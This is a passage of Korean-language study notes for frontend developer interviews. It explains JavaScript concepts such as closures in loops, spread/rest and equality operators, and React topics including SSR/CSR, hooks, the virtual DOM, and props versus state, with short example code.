  // 객체의 프로퍼티 키로 사용 가능
  const key = Symbol("key");
  const obj = { [key]: "value" };
  console.log(obj[key]); // 'value'
  ```

<br>

### # 블로킹(Blocking) vs 논블로킹(Non-Blocking)

- 제어권

  함수 코드를 실행할 권리, 제어권을 가진 함수는 자신의 코드를 끝까지 실행한 후, 자신을 호출한 함수에게 돌려준다.

- 블로킹(Blocking) vs 논블로킹(Non-Blocking) -> 제어 흐름 중심

  (1) 블로킹(Blocking) : 호출한 함수가 결과를 받을 때까지 멈춘다.

  (2) 논블로킹(Non-Blocking) : 호출한 함수가 멈추지 않고 다음 작업을 이어간다.

- 동기(Synchronous) vs 비동기(Asynchronous) -> 결과 처리 중심

  (1) 동기(Synchronous) : 호출자가 결과를 직접 받고 즉시 처리한다.

  (2) 비동기(Asynchronous) : 호출자가 결과를 직접 기다리지 않고, 콜백/프라미스 등을 통해 나중에 결과를 처리한다.

- 예시

  (1) 블로킹 + 동기 : 함수 호출자는 결과를 받을 때까지 멈추고 기다린다. 결과는 즉시 반환된다.

  (2) 블로킹 + 비동기 : 결과는 나중에 처리되지만, 호출자는 작업이 끝날 때까지 멈춰 있음.

  (3) 논블로킹 + 동기 : 결과는 즉시 반환되지만, 호출자는 멈추지 않고 다음 코드를 계속 실행한다.

  (4) 논블로킹 + 비동기 : 결과는 나중에 콜백/프라미스 등으로 처리되고, 호출자는 기다리지 않고 다음 코드 실행

<br>

### # Parameter, Argument

- 매개변수(Parameter)

  함수를 호출할 때 인수로 전달받은 값을 담는 변수이다. 함수 내부에서 사용할 수 있다. 인수를 얕은 복사한 값이다.

- 인수(Argument)(= 인자)

  함수를 호출할 때 매개변수로 전달되는 값이다.

<br>

### # 동적 언어 vs 정적 언어

- 동적 언어 (동적 타이핑 언어)

  타입(자료형)이 런타임(실행 시점)에 결정되는 언어이다. 즉, 소스 코드를 작성할 때 타입을 명시하지 않아도 되고, 변수에 어떤 타입의 값이든 할당할 수 있다. 덕분에 빠르게 코드를 작성할 수 있지만, 실행 도중 타입 관련 에러가 발생할 가능성이 있다. 대표적인 동적 언어로는 JavaScript, Ruby, Python 등이 있다.

- 정적 언어 (정적 타이핑 언어)

  타입(자료형)이 컴파일 타임(빌드 시점)에 결정되는 언어이다. 코드 작성 시 변수와 함수의 타입을 명시해야 하며, 컴파일러가 타입을 체크하여 타입 오류를 미리 발견할 수 있다. 덕분에 코드의 안정성과 가독성이 높아지고, 디버깅도 쉬워진다. 대표적인 정적 언어로는 C, C++, Java, TypeScript 등이 있습니다.

<br>

### # 크롤링

- 웹 크롤링

  웹 크롤링이란 웹 페이지에서 원하는 데이터를 자동으로 수집, 분류, 저장하는 작업을 의미한다. 주로 Selenium(셀레니움) 같은 라이브러리를 활용해 웹 브라우저를 자동으로 조작하거나, requests, BeautifulSoup, Puppeteer 등 다양한 도구로 구현할 수 있다.

- 웹 크롤링 시 유의사항

  - 크롤링 대상 서버에 과도한 부하를 주지 않기 (적절한 요청 간격 유지)

  - 저작권 등 컨텐츠 사용 권한을 준수하기

  - 크롤링을 금지하는 웹사이트나 페이지는 크롤링하지 않기 (robots.txt 파일 참고)

<br>

### # 테스트 코드

- TDD(Test Driven Development)

  TDD(테스트 주도 개발)는 테스트를 먼저 작성하고, 이후 테스트를 통과하며 실제 코드를 구현하는 개발 방식입니다. 기능 구현보다 테스트 코드를 우선 작성하며, 테스트의 피드백을 바탕으로 코드를 점진적으로 완성해 나갑니다.

- TDD(Test Driven Development) 장점

  1. 철저한 모듈화 : 테스트 작성을 위한 철저한 모듈화를 통해 가독성, 재사용성, 유지보수를 용이하게 한다.

  2. 효율적인 설계 : 테스트 작성 전 다양한 예외사항에 대해 생각해볼 수 있으며 전체적인 설계가 변경되는 일을 방지할 수 있다.

  3. 디버깅 시간 단축 : 자동화 된 유닛테스팅을 전제하므로 특정 버그를 손 쉽게 찾아낼 수 있다.

  4. 테스트 정의서 대체 : 테스트 정의서를 직접 작성하는 것보다 테스트를 자동화하여 테스트 시간을 작성하고 테스트를 빼먹는 등의 휴먼 에러를 방지할 수 있다.

- TDD(Test Driven Development) 단점

  1. 생산성의 저하 : 테스트 코드를 추가로 작성해야하고 중간 중간 테스트 후 코드를 수정해야하므로 생산성이 저하된다.

- TDD 구현 방법

  1. Red – 실패하는 테스트 작성 (아직 구현이 없으므로 실패)

  2. Green – 테스트가 통과할 수 있도록 최소한의 코드 작성

  3. Refactor – 기능을 변경하지 않으면서 코드를 리팩터링

- 테스팅 피라미드와 종류

  Google Test Automation Conference에서 제안된 테스트 피라미드와 테스트 비중

  1. UI 테스팅(E2E Testing) (10%) : 실제 사용자와 유사한 방식으로 전체 시스템을 테스트 (예 : 회원가입 → 로그인 → 마이페이지 진입까지 흐름 테스트)

  2. 통합 테스팅 (Integrating Testing) (20%) : 여러 모듈 또는 컴포넌트를 함께 동작시켜 테스트, 보통 유닛 테스트가 끝난 모듈을 묶어서 확인 (예 : 로그인 시 API 호출 → 사용자 정보 상태 업데이트 → UI 반영)

  3. 단위 테스팅 (Unit Testing) (70%) : 가장 작은 코드 단위(함수, 클래스, 컴포넌트 등)의 테스트, 외부 의존성 없이 고립된 상태에서 테스트 (예 : 함수가 특정 입력에 대해 예상한 결과를 반환하는지 확인)

<br>

### # 테스트 자동화

- 테스트 자동화

  테스트 자동화는 소프트웨어의 동작을 사람이 직접 하지 않고 자동화된 도구를 통해 테스트를 수행하는 것을 말한다. 테스트 자동화의 핵심 목적은 반복적인 테스트 작업을 효율적으로 수행하고 휴먼 에러로 인한 테스트 누락을 방지하는 데 있다. 특히 테스트 주도 개발(TDD)이나 CI/CD 환경에서는 테스트를 반복적으로 빠르게 실행해야 하므로, 자동화는 필수적이다.

- 대표적인 테스팅 라이브러리 및 프레임워크

  - 시나리오 테스트 : Cypress, Playwright 등

  - 통합 테스트 : testing library(@testing-library/react, @testing-library/vue 등)

  - 유닛 테스트 : Jest, Vitest 등 (컴포넌트 테스트는 Testing Library와 함께 쓰는 것이 일반적)

- 테스트 예시

  ```javascript
  // utils/math.js
  export function add(a, b) {
    return a + b;
  }
  ```

  ```javascript
  // __tests__/math.test.js
  import { add } from "../utils/math";

  describe("add 함수 테스트", () => {
    test("1 + 2는 3이어야 한다", () => {
      expect(add(1, 2)).toBe(3);
    });

    test("0 + 0은 0이어야 한다", () => {
      expect(add(0, 0)).toBe(0);
    });
  });
  ```

  - describe : 관련된 테스트들을 묶는 블록

  - test 또는 it : 실제 테스트 단위

  - expect(값).toBe(기댓값) : Assertion (단언문)

<br>

### # DRY원칙

돈 리피트 유얼셀프(Don’t Repeat Yourself)의 약자로 같은 코드(또는 로직)를 반복해서 작성하지 말자는 의미이다입니다. 중복을 피하고 재사용 가능한 구조로 만들자는 소프트웨어 개발의 핵심 원칙 중 하나이다.

<br>

### # for문에서의 비동기 함수 사용 시 문제, var와 let 그리고 클로저

- for문에서의 비동기 함수 사용 시 문제, var와 let 그리고 클로저

  아래와 같이 for문에서 비동기 함수 사용 시 초기 값을 var를 사용하느냐 혹은 let 사용하느냐에 따라 출력 값이 달라질 수 있다.
  이러한 결과가 나타나는 이유는 블록 레벨 스코프와 함수 레벨 스코프의 차이 때문이다.

  ```js
  // 예시1 : var 사용
  const functionScope = () => {
    for (var i = 0; i < 3; i++) {
      setTimeout(() => {
        console.log(i);
      }, 100);
    }
  };

  // 예시2: var 사용 + 클로저
  const closerFunction = () => {
    for (var i = 0; i < 3; i++) {
      ((x) => {
        setTimeout(() => {
          console.log(x);
        }, 100);
      })(i);
    }
  };

  // 예시3: let 사용
  const blockScope = () => {
    for (let i = 0; i < 3; i++) {
      setTimeout(() => {
        console.log(i);
      }, 100);
    }
  };

  functionScope(); // 3이 3번 찍힌다.
  closerFunction(); // 0, 1, 2가 순서대로 찍힌다.
  blockScope(); // 0, 1, 2가 순서대로 찍힌다.
  ```

- 예시1 functionScope에서 var 사용 시 3이 3번 찍히는 이유

  for문 동작 시 setTimeout을 호출하게 되면 콜스택에 함수컨텍스트를 생성한 후 바로 제거하여 웹API 백그라운드에서 처리된다.
  이 때 콜스택에 컨텍스트는 바로 제거되기 때문에 백그라운드에서 처리가 완료되기 전 다음 반복문으로 들어가게 된다.
  이 후 setTimeout은 비동기적으로 처리되기 때문에 나머지 for문도 방금과 같은 작업을 반복하게 된다. 그렇기 때문에
  setTimeout이 타이머에 의해 웹API에서 처리되기 전 for문은 이미 마지막 루프까지 마친 상태이기 때문에 i값은 3이 되고
  웹API에서 처리 후 큐를 통해 실행되는 setTimeout 콜백 함수들은 이 i값을 참조하게 되어 모두 3을 반환한다.

  ```js
  // 예시1 : var 사용
  const functionScope = () => {
    for (var i = 0; i < 3; i++) {
      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
    }
  };

  functionScope(); // 3이 3번 찍힌다.

  // 예시1을 풀어보면 아래와 같이 동작하는 것 같다. 디버그를 통해 확인해보면 동일하게 동작한다. 개발자 도구 우측에 클로저 필드를 보면 i가 저장되있음을 확인할 수 있다.
  // var는 함수 레벨 스코프로 동작하기 때문에 아래와 같이 함수 코드 블럭 내에 존재하는 것과 같다. 그렇기 때문에 반복되는 콜백이 바라보는 값은 동일해진다.
  const functionScopeTest = () => {
    var i = 0;

    {
      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
      i++;
    }

    {
      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
      i++;
    }

    {
      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
      i++;
    }
  };

  functionScopeTest(); // 3이 3번 찍힌다.
  ```

- 예시2 closerFunction에서 var 사용 시 클로저를 통한 해결

  클로저란 간단하게 말하면 내부함수가 외부함수에 접근할 수 있는 것을 말한다.
  기존에 동작시키던 방식과 다르게 즉시 실행 함수를 생성한 후 파라미터로 i값을 전달하는 방식을 활용한다.
  이런 방식을 활용하게 되면 콜스택에 즉시 실행 함수 컨텍스트가 쌓이고 먼저 사라지더라도 웹API에 콜백으로 넘긴
  setTimeout 콜백 함수 스코프에 파라미터로 넘긴 x의 값을 기억하고 있기 때문에 해당 x값을 참조하여 최신 값을 유지할 수 있다.

  ```js
  // 예시2: var 사용 + 클로저
  const closerFunction = () => {
    for (var i = 0; i < 3; i++) {
      ((x) => {
        setTimeout(() => {
          console.log(x);
          debugger;
        }, 100);
      })(i);
    }
  };

  closerFunction(); // 0, 1, 2가 순서대로 찍힌다.

  // 예시2를 풀어보면 아래와 같이 동작하는 것 같다. 디버그를 통해 확인해보면 동일하게 동작한다. 개발자 도구 우측에 클로저 필드를 보면 i가 저장되있음을 확인할 수 있다.
  // var는 함수 레벨 스코프로 동작하기 때문에 아래와 같이 함수 코드 블럭 내에 존재하는 것과 같다. 하지만 즉시실행함수의 인자로 i를 받아 클로저 함수를 사용하여 해결할 수 있다.
  const closerFunctionTest = () => {
    var i = 0;

    {
      ((x) => {
        setTimeout(() => {
          console.log(x);
          debugger;
        }, 100);
      })(i);
      i++;
    }

    {
      ((x) => {
        setTimeout(() => {
          console.log(x);
          debugger;
        }, 100);
      })(i);
      i++;
    }

    {
      ((x) => {
        setTimeout(() => {
          console.log(x);
          debugger;
        }, 100);
      })(i);
      i++;
    }
  };

  closerFunctionTest(); // 0, 1, 2가 순서대로 찍힌다.
  ```

- 예시3 blockScope에서 let 사용 시 0,1,2가 순서대로 찍히는 이유

  예를 들어 functionScope()와 같이 var를 사용한 경우 var는 함수 레벨 스코프를 가지기 때문에 for 루프마다 새로운 스코프를 만들어내는 것이 아닌
  functionScope 내부에 하나의 스코프로만 존재하게 된다. 그렇기 때문에 for 루프마다 동일한 참조를 바인딩해서 사용하게 되는 것이다.
  반면 blockScope()와 같이 let을 사용한 경우 let은 블록 레벨 스코프를 가지기 때문에 for 루프마다 새로운 스코프를 만들어낸다.
  i가 0인 스코프, 1인 스코프, 2인 스코프 ... 등등으로 만들어내게 되고 이 각 루프마다 만들어지는 새로운 스코프를 참조하게 되므로 서로 다른 참조를 하게 되어
  동일한 값이 출력되지 않게 된다. 아래 두 개의 함수가 동일하게 동작하는 것을 알 수 있다.

  ```js
  // 예시3: let 사용
  const blockScope = () => {
    for (let i = 0; i < 3; i++) {
      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
    }
  };

  blockScope(); // 0, 1, 2가 순서대로 찍힌다.

  // 예시3을 풀어보면 아래와 같이 동작하는 것 같다. 디버그를 통해 확인해보면 동일하게 동작한다. 개발자 도구 우측에 블럭 필드를 보면 i가 저장되있음을 확인할 수 있다.
  // 아마도 setTimeout은 즉시호출함수라 호출과 동시에 환경을 기억하게 되고 그 때 기억해놓은 스코프에 블록스코프인 i값을 저장해두는 것이 아닌가 싶다!
  const blockScopeTest = () => {
    {
      let i = 0;

      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
    }

    {
      let i = 1;

      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
    }

    {
      let i = 2;

      setTimeout(() => {
        console.log(i);
        debugger;
      }, 100);
    }
  };

  blockScopeTest(); // 0, 1, 2가 순서대로 찍힌다.
  ```

### # Spread 문법과 Rest 파라미터

- Spread 문법

  Spread 라는 단어가 가지고 있는 의미는 확산의 의미를 가지고 있다. 이 문법을 사용하면, 객체 혹은 배열을 펼칠수 있다. 즉, Spread 문법(...)은 대상을 개별 요소로 분리한다. 단, Spread 문법의 대상은 이터러블이어야 한다.

  ```javascript
  const animals = ["개", "고양이", "참새"];
  const anotherAnimals = [...animals, "비둘기"];

  console.log(animals); // ['개', '고양이', '참새']
  console.log(anotherAnimals); // ['개', '고양이', '참새', '비둘기']
  ```

- Rest 파라미터

  Rest 라는 단어가 가지고 있는 의미는 나머지라는 의미를 가지고 있다. 이 문법을 사용하면, 나머지 값을 묶어서 정의할 수 있다.

  ```javascript
  // 배열에서의 Rest
  const numbers = [0, 1, 2, 3, 4, 5, 6];
  const [one, ...rest] = numbers;

  console.log(one); // 0
  console.log(rest); // [1, 2, 3, 4, 5, 6]
  ```

  함수의 인자를 전달할 때 Rest 파라미터의 특성을 이용해서 가변 인자를 전달할 수 있다. 아래 예시 코드 내부 sum 함수는 인자로 들어오는 number를 모두 더하는 함수이다. 이 때 인자는 몇 가지가 들어올 지 모르는 가변 인자를 받고 있다. 이 때 Rest 파라미터를 사용해서 함수에 전달된 인수들의 목록을 배열로 받아 가변 인자를 받아 처리할 수 있다.

  ```javascript
  function sum(...rest) {
    return rest.reduce((acc, current) => acc + current, 0);
  }

  const result = sum(1, 2, 3, 4, 5, 6);
  console.log(result); // 21
  ```

<br>

### # 함수의 인자 복사 예시

- 자바스크립트에서 함수의 인자를 넘길 때, 인자는 값에 의한 전달(pass by value) 방식으로 처리된다. 이는 인자의 값이 복사되어 함수 내부로 전달되는 것을 의미한다. 이 때 복사하는 방식은 얕은 복사와 같이 처리된다.

  ```javascript
  const person = { name: "Lydia", age: 21 };

  const changeAge = (x = { ...person }) => (x.age += 1);

  const changeAgeAndName = (x = { ...person }) => {
    x.age += 1;
    x.name = "Sarah";
  };

  changeAge(person);
  changeAgeAndName();
  console.log(person); // { name: “Lydia”, age: 22 }
  ```

  코드의 전반적인 흐름은 객체 타입의 value를 업데이트 시키는 코드이다. value를 업데이트 시키기 위한 함수로 changeAge, changeAgeAndName 를 선언해서 사용하고 있는데 이 때 두 함수의 차이점은 호출문에서 인자 전달의 유무에서 차이점이 있다. 두 함수의 파라미터인 x식별자에 값이 할당되는 방식은 아래와 같이 할당된다.

  - changeAge : 인자로 전달 된 객체의 값을 복사하지만 참조 타입의 값을 복사하기 때문에 결국 같은 참조를 가리키게 된다. 즉 x의 값이 할당되는 방식은 const x = person와 같이 동작하게 된다.

  - changeAgeAndName : person 변수의 값 자체를 Spread로 복사하기 때문에 콜스택에서 x와 person은 서로 다른 메모리힙의 주소를 가리키고 있고 메모리힙에서의 메모리 value는 동일한 상태가 된다. 즉 x의 값이 할당되는 방식은 const x = { name: "Lydia", age: 21 }과 같이 동작하게 된다.

<br>

### # 동등 연산자 "==" vs 일치 연산자 "==="의 차이

- `==`는 동등 연산자로, 두 값을 비교할 때 자료형 타입이 다른 경우 형변환을 수행한 뒤 비교한다. 이러한 형변환은 때로 예측하지 못한 결과를 초래할 수 있다. `===`는 일치 연산자로 형변환없이 자료형 타입과 값 모두 비교한다. 따라서 일치 연산자를 활용하여 비교하는 것이 더 안전하다.

  ```javascript
  // 원시 타입 비교 예시
  console.log(100 == "100"); // true
  console.log(100 == 100); // true

  console.log(100 === "100"); // false
  console.log(100 === 100); // true
  ```

  또한 두 연산자 모두 참조 타입을 비교할 때는 동일한 참조 주소를 가리키는지 비교한다. 만약 참조 타입의 내부 값을 비교하려면 Object.entries, toString과 같은 메소드를 통해 원시 타입으로 변경해서 비교하거나 Lodash의 isEqual 메소드를 활용하여 비교할 수 있다.

  ```javascript
  // 참조 타입 비교 예시
  const a = { name: "Tom" };
  const b = { name: "Tom" };

  console.log(a == b); // ❌ false → 참조값(주소)이 다르니까 마찬가지
  console.log(a === b); // ❌ false → 내용이 같아도 서로 다른 객체이기 때문

  const c = a;
  console.log(a == c); // ✅ true → 같은 참조(주소)를 바라보고 있음
  console.log(a === c); // ✅ true → 같은 참조(주소)를 바라보고 있음
  ```

<br><br><br>

## # React

### # SSR / CSR

- SSR / CSR

  - SSR

    서버 사이드 렌더링은 서버에서 HTML 생성해 클라이언트에 전달하는 방식으로 서버에서 그려진 정적인 HTML을 우선 렌더링하고 병렬적으로 Javasciprt 번들 로드가 완료된 후 하이드레이션을 통해 사용자와 상호작용할 수 있도록 하는 방식이다.

  - CSR

    클라이언트 사이드 렌더링은 서버에서 빈 HTML을 전달받아 Javasciprt 번들 로드가 완료되면 동적으로 태그들과 스타일을 생성하여 페이지를 렌더링하는 방식이다.

- SSR / CSR 장단점

  - SSR 장점

    1. 빠른 초기 로딩 : 서버에서 HTML을 렌더링해서 전달하므로, 브라우저가 즉시 화면을 그릴 수 있어 초기 로딩 속도(FCP)가 빠름

    2. SEO 유리 : HTML에 콘텐츠가 포함되어 있어, 검색 엔진 크롤러가 내용을 인식하기 쉬워 검색 노출 최적화에 유리.

  - SSR 단점

    1. 서버 부하 높음 : 새로운 요청 시 서버가 모든 리소스를 준비해서 응답하므로 서버 부하 높고 로딩 속도 늦음

    2. 떨어지는 사용자 경험(UX) : 요청마다 새로고침되며 새 페이지를 받기 때문에, 전통적인 페이지 전환처럼 느껴져 사용자 경험이 떨어질 수 있음. (Next.js는 이를 개선했지만 일반적인 SSR 프레임워크는 여전히 해당 가능성 존재)

    3. TTV와 TTI : HTML을 받아온 후 띄워놓고 JS를 받아오기 때문에 Time To View와 Time To Interaction간에 시간 간격이 존재하여 이벤트 반응 없을 수 있음

  - CSR 장점

    1. 서버 부하 낮음 : 대부분의 로직이 클라이언트에서 처리되므로, 서버는 API 응답만 하면 되어 서버 부담이 적다.

    2. 자연스러운 사용자 경험(UX) : 새로운 요청 시 페이지가 새로고침 되지 않고 클라이언트에서 라우팅을 처리하기 때문에 자연스러운 사용자 경험

  - CSR 단점

    1. 느린 초기 로딩 : 초기에 모든 js 파일을 받아와야 하기 때문에 초기 로딩이 느림, 사용자에게 현재 불필요한 코드나 중복되는 코드 없이 적절한 사이즈의 코드가 적절한 타이밍에 동적으로 로드되도록 하는 code splitting 으로 일부 개선 가능

    2. SEO 불리 : 초기 HTML에는 콘텐츠가 없고 JS 실행 후 렌더링되므로, 검색 엔진이 내용을 수집하기 어려워 SEO에 불리함. react-helmet, react-snap, SSR/SSG 조합 등으로 보완 가능. (다만 구글 봇의 경우 Javascript 해석이 가능, 하지만 해석 실패 가능성이 있고 모든 검색 엔진에 대응하기 어렵기 떄문에 상대적으로 불리한 것은 맞음)

    3. 화면 변하는 모습 노출 : JS가 실행되기 전에는 데이터 없는 뼈대 화면이 보여질 수 있음. 로딩 스피너, 스켈레톤 UI 활용으로 개선 가능.

<br>

- SSR / CSR 동작 순서

  - SSR

    1. 브라우저가 서버에 HTML, CSS, Javascript 파일 등 렌더링에 필요한 리소스 순서대로 요청

    2. 서버에서 HTML, CSS 응답

    3. 브라우저가 HTML/CSS파싱 -> 스타일 -> 레이아웃 -> 페인트 -> 컴포지트 단계를 거쳐 컨텐츠 렌더링

    4. 컨텐츠 렌더링 후 Javascript 파일 요청, Javascript 파일이 로드되면 사용자와 DOM 요소 간 상호 작용 가능

  - CSR

    1. 브라우저가 서버에 HTML 파일 요청

    2. 서버에서 비어있는 HTML 파일 응답

    3. HTML 파일 구성을 위한 Javascript 파일 요청

    4. Javascript 파일 응답 받은 후 동적으로 HTML 파일 구성

    5. 브라우저가 구성 된 HTML 파일을 로드 및 파싱하여 컨텐츠 렌더링

<br>

### # React vs Vue vs Angular

- Libraries, Frameworks 차이

  라이브러리는 흐름을 개발자가 직접 제어한다. 필요한 기능이 있을 때 라이브러리를 가져다 사용하는 것이다. 반대로 프레임워크는 프레임워크가 흐름을 가지고 있다. 프레임워크가 짜 놓은 틀에서 코드를 작성하게 된다.

- Libraries, Frameworks 사용하는 이유

  규모가 커지고 복잡한 애플리케이션을 개발하며 생산성을 향상시키고 많은 양의 데이터 관리와 코드 유지 보수를 더욱 편리하게 하기 위해 다양한 Frontend Framework,Library가 등장하고 사용하게 되었다.

- React(라이브러리), Vue(프레임워크), Angular(프레임워크) 중 React를 사용하는 이유

  처음 프레임워크, 라이브러리 사용하여 개발을 시작하게 되었을 때 React, Vue, Angular 중 React를 선택한 이유는 더 큰 개발 생태계를 가지고 있기 때문이었습니다. 현재도 npm 패키지 다운로드 수를 비교해보면 React 패키지 다운로드 수가 압도적입니다. 또한 React나 Vue 모두 오픈 소스이고 정기적으로 버전을 릴리즈하고 있지만 개인이 기업에 후원을 받아 관리되는 Vue Facebook이 직접적으로 관리하는 React가 지속적으로 신뢰할 수 있는 라이브러리라고 생각했습니다.

<br>

### # React란

- 특징

  1. 가상 돔(Virtual DOM) : 가상 돔은 실제 DOM에 적용시키기 전 가상 DOM에 변화된 부분을 먼저 적용시킨 후 변화된 부분만 렌더링 되도록 하여 최소한의 연산을 통해 성능을 증가시킨다.

  2. 단방향 데이터 바인딩 : 데이터가 부모 → 자식 방향으로만 흐르는 단방향 데이터 바인딩 구조를 갖고 있어, 데이터의 추적이 용이하고 애플리케이션 상태를 예측하기 쉬운 장점이 있다. 거꾸로 부모의 데이터를 바꿔주기 위해서는 state를 이용해야 한다.

  3. JSX 문법과 선언형 프로그래밍 : HTML과 JavaScript를 결합한 JSX(JavaScript XML) 문법을 통해 선언적으로 프로그래밍한다. 코드의 흐름보다 결과에 집중함으로써 코드 의도 파악이 쉽다.

  - JSX : JSX는 Javascript에 XML을 추가하여 확장한 문법이다. 공식적인 자바스크립트 문법은 아니며 브라우저에서 실행하기 전 번들링 과정 중 바벨을 사용하여 일반 자바스크립트로 변환된다.

  4. 컴포넌트 기반 UI 구성 : 재사용이 가능한 개별적인 모듈인 컴포넌트를 통해 UI를 구성한다.

- 장단점

  - 장점

    1. 컴포넌트 기반 아키텍처 : UI를 독립적인 컴포넌트 단위로 구성하여 재사용성과 유지보수성이 높다.

    2. 가상 돔을 통한 성능 최적화 : 상태가 변경되면 가상 돔과 실제 돔을 비교하여 변경된 부분만 실제 DOM에 반영함으로써 불필요한 DOM의 조작을 줄여 렌더링 성능이 향상

    3. 넓은 생태계 : Vue나 Angular에 비해 사용자가 압도적으로 많고 커뮤니티나 자료가 방대, 문제 해결이나 확장 개발 시 유리

  - 단점

    1. 내장 기능 부족 : View 계층만 담당하므로 라우팅, 상태관리 등은 직접 구현하거나 React Router, Redux 같은 써드파티 라이브러리를 사용해야 하는 번거로움이 있다.

    2. CSR 기반의 한계 : CSR 기반이기 때문에 초기 렌더링 성능, SEO 문제 등이 있을 수 있다. SSR이 가능하기는 하지만 별도의 설정이 필요하다.

<br>

### # React Lifecycle Methods

- 리액트 라이프사이클 순서

  생성(mount) -> 갱신(update) -> 제거(unmount)

- 각 메소드들을 언제 사용하는지?

  (1) componentDidMount : 컴포넌트가 생성된 직 후 호출

  (2) shouldComponentUpdate : props 또는 state가 새로운 값으로 갱신되어 렌더링이 발생하기 직전에 호출

  (3) componentDidUpdate : 리렌더링 완료 후 호출

  (4) componentWillUnmount : 컴포넌트가 화면에서 사라지기 직전에 호출

  (5) componentDidCatch : render 함수 에러 발생 시 호출

- 라이프사이클 중 써본 메소드가 뭐가 있는지?

  클래스형으로 작업하지 않기 때문에 라이프사이클 메소드는 사용해본 적이 없다. 대신 생명주기 메서드를 대체할 수 있는 useEffect hook을 자주 사용하였다. useEffect에 의존성 배열로 빈 대괄호를 사용하면 componentDidMount의 역할을 하고, 함수를 return하면 componentWillUnmount 역할을 한다. 또한 의존성 배열을 아예 사용하지 않거나, 의존성 배열에 값을 넣어 componentDidUpdate를 대체할 수 있다.

- componentDidMount 와 render 중 무엇이 먼저 실행되는지?

  componentDidMount 메서드보다 render 메서드가 먼저 실행되는 것으로 알고 있다.

<br>

### # javascript로 useState 구현

```javascript
let states = [];
let currentIndex = 0;

function useState(initialValue) {
  const index = currentIndex;

  if (states[index] === undefined) {
    states[index] = initialValue;
  }

  function setState(newValue) {
    states[index] = newValue;
    render(); // 상태 변경 시 리렌더링 트리거 (가상의 함수)
  }

  currentIndex++;
  return [states[index], setState];
}

function render() {
  currentIndex = 0;
  App(); // 다시 컴포넌트 렌더링
}
```

<br>

### # useEffect hook

- 설명

  useEffect는 클래스형 컴포넌트의 생명주기 메소드를 대체하기 위해 사용한다. 컴포넌트 마운트(컴포넌트가 화면에 그려짐, 즉 렌더링 과정 중 페인트까지 완료), 컴포넌트 언마운트(컴포넌트가 화면에서 사라짐), 의존성 배열 값 변경 시 실행할 수 있다.

- 실행 예시

  - 의존성배열 값 x, return 함수 x : 내부 로직이 컴포넌트 마운트 시 실행

    ```javascript
    useEffect(() => {
      ...
    }, []);
    ```

  - 의존성배열 값 o, return 함수 x : 내부 로직이 컴포넌트 마운트 시 실행, 의존성 배열 값 변경 시 실행

    ```javascript
    useEffect(() => {
      ...
    }, [abc]);
    ```

  - 의존성배열 값 x, return 함수 o : 내부 로직이 컴포넌트 마운트 시 실행, 의존성 배열 값 변경 시 실행, return 함수는 컴포넌트 언마운트 시 실행, 의존성 값 변경 직전에 이전 이펙트 정리를 위해 실행 (이전 이펙트 정리란, 리렌더링 후 useEffect 본문을 실행하는 것이 아닌 clean up 먼저 실행 후 본문을 실행함)

    ```javascript
    useEffect(() => {
      ...

      return () => {...};
    }, []);
    ```

    ```javascript
    // 예시
    import { useEffect, useState } from "react";

    function App() {
      const [count, setCount] = useState(0);

      useEffect(() => {
        console.log("🟢 effect 실행:", count);

        return () => {
          console.log("🔴 cleanup 실행:", count);
        };
      }, [count]);

      return (
        <div>
          <p>{count}</p>
          <button onClick={() => setCount((c) => c + 1)}>증가</button>
        </div>
      );
    }

    // effect 실행: 0      ← 최초 마운트
    // cleanup 실행: 0     ← count = 1로 변경되어 리렌더링된 후
    // effect 실행: 1      ← 새로운 값 기준으로 effect 실행
    // 결론 : 리렌더링 → 화면 반영 → 그 이후에 cleanup → 본문 실행
    ```

  - 의존성배열 값 o, return 함수 o : 내부 로직이 컴포넌트 마운트 시 실행, 의존성 배열 값 변경 시 실행, return 함수는 컴포넌트 언마운트 시 실행, 의존성 값 변경 직전에 이전 이펙트 정리를 위해 실행

    ```javascript
    useEffect(() => {
      ...

      return () => {...};
    }, [abc]);
    ```

  - 의존성배열 x : 컴포넌트 리렌더링마다 실행

    ```javascript
    useEffect(() => {
      ...
    });
    ```

<br>

### # 가상 돔(Virtual DOM)

웹에서 DOM 조작은 비용이 크고 성능 저하를 일으키기 쉽다. 왜냐하면 DOM 노드 하나가 변경되면, 브라우저는 리플로우와 리페인트 단계를 다시 거치는 리렌더링이 발생한다. 리렌더링은 연산 비용이 크기 때문에 잦게 발생하는 경우 성능 저하를 유발하게 된다.

특히 SPA(싱글 페이지 애플리케이션)는 CSR(클라이언트 사이드 렌더링) 방식을 채택하여 사용하는데 CSR은 javascript로 HTML을 생성하며 잦은 돔의 변화가 일어난다는 특징이 있다. 그런데 DOM에 변화가 일어날 때마다 리렌더링 과정을 반복하게 되면 많은 연산 비용이 발생하게 되므로 성능 이슈가 발생할 수가 있다.

react는 이 문제를 해결하기 위해 가상 돔을 사용한다. 가상 돔은 이전 가상 돔의 상태를 메모리에 저장해놓고 메모리 상에서 이전 가상 돔(변경 전)과 새로운 가상 돔(변경 후)의 상태를 비교한 뒤 최소한의 내용만 실제 DOM에 반영 하는 프로그래밍 개념이다.

가상 돔은 실제 렌더링하는 것이 아닌 메모리 상에서 동작하기 때문에 훨씬 빠르고 여러 번에 상태 변화 시 배치처리를 통해 한번에 실제 돔에 반영시키므로 리렌더링 횟수를 최소화하여 성능을 크게 향상시켰다.

<br>

### # Props / State

- Props

  상위 컴포넌트가 하위 컴포넌트에 전달하는 데이터를 가진 객체이다. 단방향 데이터 흐름을 가지며 자식 입장에서는 직접 수정할 수 없다는 특징이 있다. 변수, state, 함수 등 모두 전달할 수 있다.

- State

  컴포넌트 내부에서 가지고 있는 컴포넌트의 상태값이다. 유동적인 데이터를 다루기 위한 객체이다.

- let으로 변수 선언해서 관리하면 될껄 왜 state로 관리할까?

  state는 일반 변수와 다르다. setState를 통해 값이 변하게 되면 render 함수를 호출하여 자동으로 리렌더링이 발생한다. 값이 변함에 따라 컴포넌트를 최신으로 유지해야 하기 때문에 render 함수를 호출하는 state를 사용하는 것이다. let과 같은 일반 변수는 값이 변경되어도 자동으로 리렌더링이 발생하지 않는다.

- Props vs State

  1. props는 자식 컴포넌트로 전달되고 state는 컴포넌트가 직접 관리한다.

  2. props는 직접 변경할 수 없고 state는 직접 변경이 가능하다.

